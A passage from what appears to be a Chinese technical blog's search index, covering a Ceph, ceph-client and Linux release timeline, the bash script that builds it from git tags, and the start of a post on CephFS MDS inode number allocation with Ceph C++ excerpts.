04:18:38">v6.7</a></td></tr><tr><td align="center">2024-02</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.15" title="2024-02-27 03:21:10">v16.2.15</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.8-rc4" title="2024-02-09 23:28:03">ceph-for-6.8-rc4</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.8-rc5" title="2024-02-17 01:29:10">ceph-for-6.8-rc5</a></td><td align="center"></td></tr><tr><td align="center">2024-03</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v18.2.2" title="2024-03-05 04:04:06">v18.2.2</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.8-rc7" title="2024-03-02 01:18:12">ceph-for-6.8-rc7</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.8-rc8" title="2024-03-09 06:52:18">ceph-for-6.8-rc8</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.9-rc1" title="2024-03-23 01:37:38">ceph-for-6.9-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.8" title="2024-03-11 04:38:09">v6.8</a></td></tr><tr><td align="center">2024-04</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.9-rc4" title="2024-04-13 00:13:38">ceph-for-6.9-rc4</a></td><td align="center"></td></tr><tr><td align="center">2024-05</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.10-rc1" title="2024-05-25 17:41:59">ceph-for-6.10-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.9" title="2024-05-13 05:12:29">v6.9</a></td></tr><tr><td align="center">2024-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v18.2.4" title="2024-07-12 21:57:23">v18.2.4</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.10-rc8" title="2024-07-13 00:38:14">ceph-for-6.10-rc8</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.11-rc1" title="2024-07-26 22:36:46">ceph-for-6.11-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.10" title="2024-07-15 06:43:32">v6.10</a></td></tr><tr><td align="center">2024-08</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.11-rc2" title="2024-08-03 00:34:18">ceph-for-6.11-rc2</a></td><td align="center"></td></tr><tr><td align="center">2024-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v19.2.0" title="2024-09-19 00:27:51">v19.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.12-rc1" title="2024-09-28 05:40:03">ceph-for-6.12-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.11" title="2024-09-15 22:57:56">v6.11</a></td></tr><tr><td align="center">2024-10</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.12-rc2" title="2024-10-04 23:15:47">ceph-for-6.12-rc2</a></td><td align="center"></td></tr><tr><td align="center">2024-11</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.8" title="2024-11-12 05:31:50">v17.2.8</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.13-rc1" title="2024-11-30 01:49:46">ceph-for-6.13-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.12" title="2024-11-18 06:15:08">v6.12</a></td></tr><tr><td align="center">2024-12</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.13-rc4" title="2024-12-21 03:35:01">ceph-for-6.13-rc4</a></td><td align="center"></td></tr><tr><td align="center">2025-01</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.13" title="2025-01-20 07:51:45">v6.13</a></td></tr><tr><td align="center">2025-02</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v19.2.1" title="2025-02-01 07:14:13">v19.2.1</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.14-rc1" title="2025-02-01 02:05:12">ceph-for-6.14-rc1</a></td><td align="center"></td></tr><tr><td align="center">2025-03</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.14" title="2025-03-24 22:02:41">v6.14</a></td></tr><tr><td align="center">2025-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v18.2.5" title="2025-04-08 00:49:17">v18.2.5</a><br><a href="https://github.com/ceph/ceph/releases/tag/v18.2.6" title="2025-04-17 05:22:52">v18.2.6</a><br><a href="https://github.com/ceph/ceph/releases/tag/v19.2.2" title="2025-04-09 05:08:38">v19.2.2</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.15-rc4" title="2025-04-26 02:33:19">ceph-for-6.15-rc4</a></td><td align="center"></td></tr><tr><td align="center">2025-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.9" title="2025-05-21 00:52:45">v17.2.9</a><br><a href="https://github.com/ceph/ceph/releases/tag/v18.2.7" title="2025-05-07 07:15:56">v18.2.7</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.15" title="2025-05-26 07:09:23">v6.15</a></td></tr><tr><td align="center">2025-06</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.16-rc1" title="2025-06-07 01:26:51">ceph-for-6.16-rc1</a></td><td align="center"></td></tr><tr><td align="center">2025-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v19.2.3" title="2025-07-17 10:58:27">v19.2.3</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.16" title="2025-07-28 05:26:38">v6.16</a></td></tr><tr><td align="center">2025-09</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.17-rc6" title="2025-09-13 23:46:10">ceph-for-6.17-rc6</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.17" title="2025-09-29 05:39:22">v6.17</a></td></tr><tr><td align="center">2025-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v20.2.0" title="2025-10-30 23:22:25">v20.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.18-rc1" title="2025-10-11 02:01:59">ceph-for-6.18-rc1</a></td><td align="center"></td></tr><tr><td align="center">2025-11</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.18-rc8" title="2025-11-28 02:33:28">ceph-for-6.18-rc8</a></td><td align="center"></td></tr><tr><td align="center">2025-12</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.19-rc1" title="2025-12-13 02:42:23">ceph-for-6.19-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.18" title="2025-12-01 06:42:10">v6.18</a></td></tr></tbody></table><h2 id="1-2、版本对照时间轴"><a href="#1-2、版本对照时间轴" class="headerlink" title="1.2、版本对照时间轴"></a>1.2、版本对照时间轴</h2><p><strong>版本时间轴:</strong></p><pre><code class="hljs mermaid">%%&#123;init: &#123;  &quot;theme&quot;:&quot;base&quot;,  &quot;themeVariables&quot;: &#123;    &quot;primaryColor&quot;: &quot;#1f78b4&quot;,    &quot;sectionBkgColor&quot;: &quot;#f4f8ff&quot;,    &quot;doneTaskColor&quot;: &quot;#1f78b4&quot;,    &quot;fontSize&quot;:&quot;11px&quot;  &#125;&#125;&#125;%%gantt  title Ceph 版本时间线 (2015–2025)  dateFormat  YYYY-MM-DD  axisFormat  %Y-%m  section Ceph Releases    v9.2.0 :done, 2015-11-04, 20d    v9.2.1 :done, 2016-02-25, 20d    v10.2.0 :done, 2016-04-20, 20d    v10.2.1 :done, 2016-05-14, 20d    v10.2.3 :done, 2016-09-21, 20d    v11.2.0 :done, 2017-01-19, 20d    v12.2.0 :done, 2017-08-29, 20d    v13.2.0 :done, 2018-05-31, 20d    v14.2.0 :done, 2019-03-18, 20d    v15.2.0 :done, 2020-03-24, 20d    v16.2.0 :done, 2021-03-31, 20d    v17.2.0 :done, 2022-04-19, 20d    v18.2.0 :done, 2023-08-04, 20d    v19.2.0 :done, 2024-09-19, 20d    v19.2.1 :done, 2025-02-01, 20d    v19.2.2 :done, 2025-04-09, 20d    v19.2.3 :done, 2025-07-17, 20d    v20.2.0 :done, 2025-10-30, 20d</code></pre><pre><code class="hljs mermaid">%%&#123;init: &#123;  &quot;theme&quot;:&quot;base&quot;,  &quot;themeVariables&quot;: &#123;    &quot;primaryColor&quot;: &quot;#33a02c&quot;,    &quot;sectionBkgColor&quot;: &quot;#f5fff4&quot;,    &quot;activeTaskColor&quot;: &quot;#33a02c&quot;,    &quot;fontSize&quot;:&quot;11px&quot;  &#125;&#125;&#125;%%gantt  title Ceph‑client 版本时间线 (2016–2025)  dateFormat  YYYY-MM-DD  axisFormat  %Y-%m  section Ceph‑client Tags    ceph-for-4.7-rc8 :active, 2016-07-23, 15d    ceph-for-4.8-rc1 :active, 2016-08-02, 15d    ceph-for-4.9-rc1 :active, 2016-10-08, 15d    ceph-for-4.10-rc1 :active, 2016-12-17, 15d    ceph-for-4.11-rc1 :active, 2017-02-28, 15d    ceph-for-4.14-rc1 :active, 2017-09-12, 15d    ceph-for-4.15-rc1 :active, 2017-11-21, 15d    ceph-for-4.16-rc1 :active, 2018-02-08, 15d    ceph-for-4.17-rc1 :active, 2018-04-11, 15d    ceph-for-4.18-rc1 :active, 2018-06-14, 15d    ceph-for-4.19-rc1 :active, 2018-08-20, 15d    ceph-for-4.20-rc1 :active, 2018-11-01, 15d    ceph-for-5.0-rc1  :active, 2019-01-03, 15d    ceph-for-5.5-rc1  :active, 2019-12-05, 15d    ceph-for-5.10-rc1 :active, 2020-10-21, 15d    ceph-for-5.15-rc1 :active, 2021-09-08, 15d    ceph-for-6.0-rc1  :active, 2022-10-13, 15d    ceph-for-6.5-rc1  :active, 2023-07-07, 15d    ceph-for-6.10-rc1 :active, 2024-05-25, 15d    ceph-for-6.15-rc4 :active, 2025-04-26, 15d    ceph-for-6.18-rc1 :active, 2025-10-11, 15d</code></pre><pre><code class="hljs mermaid">%%&#123;init: &#123;  &quot;theme&quot;:&quot;base&quot;,  &quot;themeVariables&quot;: &#123;    &quot;primaryColor&quot;: &quot;#e31a1c&quot;,    &quot;sectionBkgColor&quot;: &quot;#fff5f5&quot;,    &quot;critColor&quot;: &quot;#e31a1c&quot;,    &quot;fontSize&quot;:&quot;11px&quot;  &#125;&#125;&#125;%%gantt  title Linux Kernel 版本时间线 (2015–2025)  dateFormat  YYYY-MM-DD  axisFormat  %Y-%m  section Linux Kernel    v4.3 :crit, 2015-11-02, 15d    v4.4 :crit, 2016-01-11, 15d    v4.5 :crit, 2016-03-14, 15d    v4.6 :crit, 2016-05-16, 15d    v4.7 :crit, 2016-07-25, 15d    v4.8 :crit, 2016-10-03, 15d    v4.9 :crit, 2016-12-12, 15d    v4.10 :crit, 2017-02-20, 15d    v4.11 :crit, 2017-05-01, 15d    v4.12 :crit, 2017-07-03, 15d    v4.13 :crit, 2017-09-04, 15d    v4.14 :crit, 2017-11-13, 15d    v4.15 :crit, 2018-01-29, 15d    v4.16 :crit, 2018-04-02, 15d    v4.17 :crit, 2018-06-04, 15d    v4.18 :crit, 2018-08-13, 15d    v4.19 :crit, 2018-10-22, 15d    v5.0 :crit, 2019-03-04, 15d    v5.5 :crit, 2020-01-27, 15d    v5.10 :crit, 2020-12-14, 15d    v5.15 :crit, 2021-11-01, 15d    v6.0 :crit, 2022-10-03, 15d    v6.5 :crit, 2023-08-28, 15d    v6.10 :crit, 2024-07-15, 15d    v6.15 :crit, 2025-05-26, 15d    v6.18 :crit, 2025-12-01, 15d</code></pre><h1 id="二、相关脚本"><a href="#二、相关脚本" class="headerlink" title="二、相关脚本"></a>二、相关脚本</h1><h2 id="2-1、版本时间对照表生成脚本"><a href="#2-1、版本时间对照表生成脚本" class="headerlink" title="2.1、版本时间对照表生成脚本"></a>2.1、版本时间对照表生成脚本</h2><p>以下脚本在执行时需要提前讲 ceph, ceph-client, linux 对应的git项目下载到当前脚本的目录中。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env bash</span><br><span class="hljs-built_in">set</span> -euo pipefail<br><br><span class="hljs-comment"># 定义三个仓库及其 GitHub releases 地址前缀</span><br><span class="hljs-built_in">declare</span> -A REPO_URLS=(<br>    [<span class="hljs-string">&quot;ceph&quot;</span>]=<span class="hljs-string">&quot;https://github.com/ceph/ceph/releases/tag&quot;</span><br>    [<span class="hljs-string">&quot;ceph-client&quot;</span>]=<span class="hljs-string">&quot;https://github.com/ceph/ceph-client/releases/tag&quot;</span><br>    [<span class="hljs-string">&quot;linux&quot;</span>]=<span class="hljs-string">&quot;https://github.com/torvalds/linux/releases/tag&quot;</span><br>)<br><br>repos=( <span class="hljs-string">&quot;ceph&quot;</span> <span class="hljs-string">&quot;ceph-client&quot;</span> <span class="hljs-string">&quot;linux&quot;</span> )<br><br><span class="hljs-comment"># 打印 Markdown 表头（居中对齐）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;| Month | ceph | ceph-client | linux |&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;|:------:|:------:|:-------------:|:------:|&quot;</span><br><br><span class="hljs-comment"># 将多仓库tag信息以内存管道的形式汇集</span><br>(<br>  <span class="hljs-keyword">for</span> repo <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;repos[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>      [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$repo</span>/.git&quot;</span> ]] || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;仓库 <span class="hljs-variable">$repo</span> 不存在&quot;</span> &gt;&amp;2; <span class="hljs-built_in">continue</span>; &#125;<br>      <span class="hljs-built_in">pushd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$repo</span>&quot;</span> &gt;/dev/null<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$repo</span>&quot;</span> <span class="hljs-keyword">in</span><br>          ceph)<br>              tags=$(git tag --list <span class="hljs-string">&#x27;v*&#x27;</span> | grep -E <span class="hljs-string">&#x27;^v[0-9]+\.2\.[0-9]+$&#x27;</span> || <span class="hljs-literal">true</span>)<br>              ;;<br>          ceph-client)<br>              tags=$(git tag --list <span class="hljs-string">&#x27;ceph-for*&#x27;</span> || <span class="hljs-literal">true</span>)<br>              ;;<br>          linux)<br>              tags=$(git tag --list <span class="hljs-string">&#x27;v[0-9]*.[0-9]*&#x27;</span> | grep -E <span class="hljs-string">&#x27;^v[0-9]+\.[0-9]+$&#x27;</span> || <span class="hljs-literal">true</span>)<br>              ;;<br>          *)<br>              tags=$(git tag)<br>              ;;<br>      <span class="hljs-keyword">esac</span><br><br>      <span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> <span class="hljs-variable">$tags</span>; <span class="hljs-keyword">do</span><br>          ttime=$(git for-each-ref --format=<span class="hljs-string">&#x27;%(taggerdate:iso8601)&#x27;</span> <span class="hljs-string">&quot;refs/tags/<span class="hljs-variable">$tag</span>&quot;</span> | <span class="hljs-built_in">head</span> -n 1)<br>          [[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$ttime</span>&quot;</span> ]] || ttime=$(git <span class="hljs-built_in">log</span> -1 --format=%ai <span class="hljs-string">&quot;<span class="hljs-variable">$tag</span>&quot;</span>)<br>          [[ -z <span class="hljs-string">&quot;<span class="hljs-variable">$ttime</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">continue</span><br><br>          month=$(TZ=<span class="hljs-string">&quot;Asia/Shanghai&quot;</span> <span class="hljs-built_in">date</span> -d <span class="hljs-string">&quot;<span class="hljs-variable">$ttime</span>&quot;</span> <span class="hljs-string">&quot;+%Y-%m&quot;</span>)<br>          btime=$(TZ=<span class="hljs-string">&quot;Asia/Shanghai&quot;</span> <span class="hljs-built_in">date</span> -d <span class="hljs-string">&quot;<span class="hljs-variable">$ttime</span>&quot;</span> <span class="hljs-string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)<br>          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$month</span>,<span class="hljs-variable">$repo</span>,<span class="hljs-variable">$tag</span>,<span class="hljs-variable">$btime</span>&quot;</span><br>      <span class="hljs-keyword">done</span><br>      <span class="hljs-built_in">popd</span> &gt;/dev/null<br>  <span class="hljs-keyword">done</span><br>) | awk -F, <span class="hljs-string">&#x27;</span><br><span class="hljs-string">BEGIN&#123;</span><br><span class="hljs-string">  ceph_url=&quot;https://github.com/ceph/ceph/releases/tag&quot;;</span><br><span class="hljs-string">  ccli_url=&quot;https://github.com/ceph/ceph-client/releases/tag&quot;;</span><br><span class="hljs-string">  linux_url=&quot;https://github.com/torvalds/linux/releases/tag&quot;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  month=$1; repo=$2; tag=$3; t=$4;</span><br><span class="hljs-string">  if      (repo==&quot;ceph&quot;)        base=ceph_url;</span><br><span class="hljs-string">  else if (repo==&quot;ceph-client&quot;) base=ccli_url;</span><br><span class="hljs-string">  else if (repo==&quot;linux&quot;)       base=linux_url;</span><br><span class="hljs-string">  else                          base=&quot;&quot;;</span><br><span class="hljs-string">  link=sprintf(&quot;[%s](%s/%s) (%s)&quot;, tag, base, tag, t);</span><br><span class="hljs-string">  data[month,repo] = data[month,repo] ? data[month,repo] &quot;&lt;br&gt;&quot; link : link;</span><br><span class="hljs-string">  months[month]=1;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">END&#123;</span><br><span class="hljs-string">  PROCINFO[&quot;sorted_in&quot;]=&quot;@ind_str_asc&quot;;</span><br><span class="hljs-string">  for (m in months)&#123;</span><br><span class="hljs-string">    ceph  = (data[m,&quot;ceph&quot;]       ? data[m,&quot;ceph&quot;]       : &quot;&quot;);</span><br><span class="hljs-string">    ccli  = (data[m,&quot;ceph-client&quot;]? data[m,&quot;ceph-client&quot;]: &quot;&quot;);</span><br><span class="hljs-string">    linux = (data[m,&quot;linux&quot;]      ? data[m,&quot;linux&quot;]      : &quot;&quot;);</span><br><span class="hljs-string">    printf(&quot;| %s | %s | %s | %s |\n&quot;, m, ceph, ccli, linux);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CephFS Inode 编号的申请与释放</title>
      <link href="/2025/08/09/cephfs-inode-num/"/>
      <url>/2025/08/09/cephfs-inode-num/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Inode-编号介绍"><a href="#一、Inode-编号介绍" class="headerlink" title="一、Inode 编号介绍"></a>一、Inode 编号介绍</h1><h2 id="1-1、编号规则"><a href="#1-1、编号规则" class="headerlink" title="1.1、编号规则"></a>1.1、编号规则</h2><p>在 CephFS 中 MDS 负责管理所有的 Inode 信息。CephFS 本身支持 <a href="https://docs.ceph.com/en/latest/cephfs/multimds/">多MDS</a> 策略，为了避免多MDS 分配的 Inode 出现冲突，所以 MDS 在分配 Inode 的时候需要使用 RankID 来区分 Inode 的范围。每个 MDS 中限制 Inode 分配范围的函数为 <code>InoTable::reset_state</code> ，每个 MDS 中负责的 Inode 范围为：<code>[(rank+1) &lt;&lt; 40, ((rank+1) &lt;&lt; 40))</code> ，即从 <code>(rank+1) &lt;&lt; 40</code> 开始的连续 <code>1 &lt;&lt; 40</code> 个 Inode 。</p><table><thead><tr><th align="left">MDSRank</th><th align="left">起始Inode编号(十进制)</th><th align="left">起始Inode编号(十六进制)</th><th align="left">结束Inode编号(十六进制)</th><th align="left">管辖的Inode数量</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">1,099,511,627,776</td><td align="left"><strong>0x10000000000</strong></td><td align="left"><strong>0x1FFFFFFFFF</strong></td><td align="left">1,099,511,627,776</td></tr><tr><td align="left"><strong>1</strong></td><td align="left">2,199,023,255,552</td><td align="left"><strong>0x20000000000</strong></td><td align="left"><strong>0x2FFFFFFFFF</strong></td><td align="left">1,099,511,627,776</td></tr><tr><td align="left"><strong>2</strong></td><td align="left">3,298,534,883,328</td><td align="left"><strong>0x30000000000</strong></td><td align="left"><strong>0x3FFFFFFFFF</strong></td><td align="left">1,099,511,627,776</td></tr><tr><td align="left"><strong>3</strong></td><td align="left">4,398,046,511,104</td><td align="left"><strong>0x40000000000</strong></td><td align="left"><strong>0x4FFFFFFFFF</strong></td><td align="left">1,099,511,627,776</td></tr><tr><td align="left"><strong>4</strong></td><td align="left">5,497,558,138,880</td><td align="left"><strong>0x50000000000</strong></td><td align="left"><strong>0x5FFFFFFFFF</strong></td><td align="left">1,099,511,627,776</td></tr><tr><td align="left"><strong>…</strong></td><td align="left">…</td><td align="left">…</td><td align="left">…</td><td align="left">…</td></tr><tr><td align="left"><strong>n</strong></td><td align="left"><code>(n+1) * (1 &lt;&lt; 40)</code></td><td align="left"><strong><code>(n+1) &lt;&lt; 40</code></strong></td><td align="left"><strong><code>(n+1) &lt;&lt; 40</code> + <code>(1 &lt;&lt; 40)</code> - 1</strong></td><td align="left"><strong><code>1 &lt;&lt; 40</code></strong></td></tr></tbody></table><p><strong>相关代码:</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MDSRank</span> &#123;<br><span class="hljs-keyword">public</span>:<br>  InoTable *inotable = <span class="hljs-literal">nullptr</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InoTable::reset_state</span><span class="hljs-params">()</span> </span>&#123;<br>  free.<span class="hljs-built_in">clear</span>();<br>  <span class="hljs-comment">// inode 开始编号</span><br>  <span class="hljs-type">uint64_t</span> start = (<span class="hljs-type">uint64_t</span>)(rank + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">40</span>;<br>  <span class="hljs-comment">// inode 数量</span><br>  <span class="hljs-type">uint64_t</span> len = (<span class="hljs-type">uint64_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">40</span>;<br>  <span class="hljs-comment">// 加入 free</span><br>  free.<span class="hljs-built_in">insert</span>(start, len);<br>  <span class="hljs-comment">// 设置 projected_free</span><br>  projected_free = free;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Session</span> : <span class="hljs-keyword">public</span> RefCountedObject &#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-type">session_info_t</span> info;<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">session_info_t</span> &#123;<br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; prealloc_inos;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2、相关配置与命令"><a href="#1-2、相关配置与命令" class="headerlink" title="1.2、相关配置与命令"></a>1.2、相关配置与命令</h2><p><strong>相关配置:</strong></p><ul><li><code>mds_client_prealloc_inos</code> :<ul><li><strong>含义</strong>： 为每个客户端会话预分配的 inode 编号数量。</li><li><strong>默认值</strong>： 1000</li></ul></li></ul><p><strong>相关命令</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 mds 中剩余的 inode</span><br>cephfs-table-tool all show inode<br></code></pre></td></tr></table></figure><h1 id="二、Inode-编号申请逻辑"><a href="#二、Inode-编号申请逻辑" class="headerlink" title="二、Inode 编号申请逻辑"></a>二、Inode 编号申请逻辑</h1><p>MDS 为了提升 Inode 编号的分配效率，会为每个 Session 预先分配一些 Inode 编号，当客户端申请 Inode 编号的时候则会优先从 Session 中申请，如果申请失败则会尝试从全局的 Inode 编号表中申请。当客户端与 MDS 建立连接之后，只有需要创建新的文件或者目录，才会调用 <code>Server::prepare_new_inode</code> 函数来申请新的 Inode 编号。</p><p><strong><code>Server::prepare_new_inode</code> 函数的相关调用链路如下:</strong></p><pre><code class="hljs mermaid">graph TD    %% --- 定义样式 ---    classDef outer fill:#e1f5ff,stroke:#01579b,stroke-width:1px,color:#000;    classDef mid fill:#fff3e0,stroke:#e65100,stroke-width:1px,color:#000;    classDef final fill:#e8f5e8,stroke:#2e7d32,stroke-width:1px,color:#000;    %% --- 节点定义 ---    A[Server::dispatch_client_request]    B1[Server::handle_client_openc]    B2[Server::handle_client_mknod]    B3[Server::handle_client_mkdir]    B4[Server::handle_client_symlink]    C[Server::prepare_new_inode]    D[InoTable::project_alloc_id]    %% --- 链路定义 ---    A -- CEPH_MDS_OP_CREATE --&gt; B1    A -- CEPH_MDS_OP_MKNOD --&gt; B2    A -- CEPH_MDS_OP_MKDIR --&gt; B3    A -- CEPH_MDS_OP_SYMLINK --&gt; B4    B1 --&gt; C    B2 --&gt; C    B3 --&gt; C    B4 --&gt; C    C --&gt; D    %% --- 样式绑定 ---    class A outer    class B1,B2,B3,B4 mid    class C mid    class D final</code></pre><h2 id="2-1、从-Session-中申请"><a href="#2-1、从-Session-中申请" class="headerlink" title="2.1、从 Session 中申请"></a>2.1、从 Session 中申请</h2><p><strong>执行流程:</strong></p><ul><li>检查是否允许使用预分配 inode 编号 (<code>allow_prealloc_inos</code>, 要求会话需要处于 open 状态);</li><li>调用 <code>mdr-&gt;session-&gt;take_ino(_useino)</code> 获取 inode 号;<ul><li><strong>指定 inode 号模式</strong>: 验证 inode 号属于会话预分配池 <code>info.prealloc_inos</code> , 然后从从当前状态集合中移除;<ul><li>若在 <code>delegated_inos</code> 中，则移除 (客户端重试场景);</li><li>若在 <code>free_prealloc_inos</code> 中，则移除 (正常分配);</li><li>否则断言失败 (状态不一致);</li></ul></li><li><strong>自动分配模式</strong>: <ul><li>检查 <code>free_prealloc_inos</code> 是否为空;</li><li>取最小可用号段起始值 <code>range_start()</code>;</li><li>从 <code>free_prealloc_inos</code> 中移除该 inode 号;</li></ul></li></ul></li><li>记录分配结果到 <code>mdr-&gt;used_prealloc_ino</code>;</li></ul><p><strong>相关代码:</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Server::prepare_new_inode 函数中从 Session 中分配 Inode 的代码</span><br><span class="hljs-keyword">if</span> (allow_prealloc_inos &amp;&amp; (mdr-&gt;used_prealloc_ino = _inode-&gt;ino = mdr-&gt;session-&gt;<span class="hljs-built_in">take_ino</span>(_useino))) &#123;<br>  <span class="hljs-keyword">if</span> (mdcache-&gt;<span class="hljs-built_in">test_and_clear_taken_inos</span>(_inode-&gt;ino)) &#123;<br>    _inode-&gt;ino = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">dout</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;prepare_new_inode used_prealloc &quot;</span> &lt;&lt; mdr-&gt;used_prealloc_ino &lt;&lt; <span class="hljs-string">&quot; (&quot;</span><br>              &lt;&lt; mdr-&gt;session-&gt;info.prealloc_inos.<span class="hljs-built_in">size</span>() &lt;&lt; <span class="hljs-string">&quot; left)&quot;</span><br>              &lt;&lt; <span class="hljs-string">&quot; but has been taken, will try again!&quot;</span> &lt;&lt; dendl;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    mds-&gt;sessionmap.<span class="hljs-built_in">mark_projected</span>(mdr-&gt;session);<br>    <span class="hljs-built_in">dout</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;prepare_new_inode used_prealloc &quot;</span> &lt;&lt; mdr-&gt;used_prealloc_ino &lt;&lt; <span class="hljs-string">&quot; (&quot;</span><br>              &lt;&lt; mdr-&gt;session-&gt;info.prealloc_inos.<span class="hljs-built_in">size</span>() &lt;&lt; <span class="hljs-string">&quot; left)&quot;</span> &lt;&lt; dendl;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Session 类中 Inode 的相关变量</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Session</span> : <span class="hljs-keyword">public</span> RefCountedObject &#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">// 记录已预分配但尚未提交到日志的inode号区间</span><br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; pending_prealloc_inos;<br>  <span class="hljs-comment">// 记录可立即分配给客户端的空闲预分配inode号</span><br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; free_prealloc_inos;<br>  <span class="hljs-comment">// 记录已正式分配给客户端的inode号</span><br>  interval_set&lt;<span class="hljs-type">inodeno_t</span>&gt; delegated_inos;<br>&#125;<br><br><span class="hljs-comment">// 申请 Inode</span><br><span class="hljs-function"><span class="hljs-type">inodeno_t</span> <span class="hljs-title">take_ino</span><span class="hljs-params">(<span class="hljs-type">inodeno_t</span> ino = <span class="hljs-number">0</span>)</span> </span>&#123;<br>  <span class="hljs-comment">// 指定inode号模式</span><br>  <span class="hljs-keyword">if</span> (ino) &#123;<br>    <span class="hljs-comment">// 验证inode号是否在预分配池中</span><br>    <span class="hljs-keyword">if</span> (!info.prealloc_inos.<span class="hljs-built_in">contains</span>(ino)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    